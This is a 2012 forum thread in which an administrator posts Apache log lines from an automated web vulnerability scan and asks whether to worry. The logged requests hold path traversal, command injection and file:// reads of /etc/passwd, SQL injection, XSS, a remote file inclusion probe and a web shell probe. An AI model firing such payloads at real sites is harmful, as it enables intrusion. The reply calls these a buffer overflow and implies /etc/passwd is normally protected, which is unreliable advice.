---
title: "apache logs /etc/passwd :s"
date: 2012-07-13
forum: Security
---

### Post by SlugSlug on 2012-07-13
Found this and a lot more like it in Apache logs, should I worry? It's the /etc/passwd bit I dnt like

```
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=ucp.php%00&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 3580 "-" "Mozilla/4.0 (compatible; 
MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=%24%7b%40print%28md5%28acunetix_wvs_security_test%29%29%7d HTTP/1.1" 200 4019 "-" "M
ozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /login_up.php3?login_name=x&passwd=x&locale_id=\\..\\common_func.php3%00.jpg HTTP/1.1" 404 508 "-" "-"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=login&sid=%21%28%28%29%26%26%21%7c*%7c*%7c HTTP/1.1" 200 3559 "-" "Mozilla/4.0 (compatible; MSIE 
8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=login&sid=http%3a%2f%2ftestphp.vulnweb.com%2facunetix_file_inclusion_test%3f HTTP/1.1" 200 3554 "
-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=%26cat%20%2fetc%2fpasswd%26 HTTP/1.1" 200 4019 "-" "Mozilla/4.0 (compatible; MSIE 8.
0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /styles/art_clr_black/aspxspy.aspx HTTP/1.1" 404 520 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
/././././././././././././././././././././././././././././././././././././././././././.&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 3645 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Win
dows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /redirect.php/%22%3E%3Cscript%3Ealert(413775683497)%3C/script%3E?subject=server&server=test HTTP/1.1" 404 544 "
-" "-"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=ucp.php%2f.&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 3581 "-" "Mozilla/4.0 (compatible;
 MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=-1%22%20or%20%223%22%3d%223&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 3595 "-" "Mozilla/
4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=1e309 HTTP/1.1" 200 4014 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=%24%7b%40print%28md5%28acunetix_wvs_security_test%29%29%7d%5c HTTP/1.1" 200 4020 "-"
 "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=login&sid=%5e%28%23%24%21%40%23%24%29%28%28%29%29%29****** HTTP/1.1" 200 3558 "-" "Mozilla/4.0 (c
ompatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=delete_cookies&sid=http%3a%2f%2fsome-inexistent-website.acu%2fsome_inexistent_file_with_long_name
 HTTP/1.1" 200 3011 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=%0acat%20%2fetc%2fpasswd%0a HTTP/1.1" 200 4022 "-" "Mozilla/4.0 (compatible; MSIE 8.
0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 4017 "-" "Mozilla/4.0 (compatible; MS
IE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=file%3a%2f%2f%2fetc%2fpasswd&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 3588 "-" "Mozilla
/4.0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 4015 "-" "Mozilla/4.0 (compatible; MS
IE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /faq.php?cat_id=1%27%20or%20force_mysql_error%3D%272 HTTP/1.1" 200 13470 "-" "-"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=register&sid=%27%22%27%22%29%3b%7c%5d*%7b%250d%250a%3c%2500%3e HTTP/1.1" 200 4024 "-" "Mozilla/4.
0 (compatible; MSIE 8.0; Windows NT 6.0)"
host242-140.excalibur.tvcconnect.net - - [11/Jul/2012:18:40:54 +0100] "GET /ucp.php?mode=-1%22%20or%20%223%22%3d%220&sid=61fd539de9565db676448e8c008cb3db HTTP/1.1" 200 3595 "-" "Mozilla/
4.0 (compatible; MSIE 8.0; Windows NT 6.0)"

```

---

### Post by Cheesemill on 2012-07-13
It looks like someone is attempting a buffer overflow attack on your system.

As long as your system is up to date and the user that Apache is running under (usually www-data) doesn't have access to /etc/passwd then you are as protected as you can be.

Attacks like this are run automatically by the millions of script kiddies and bots that hang about on the internet.

---

### Post by SlugSlug on 2012-07-13
cheers, much appreciate it

---

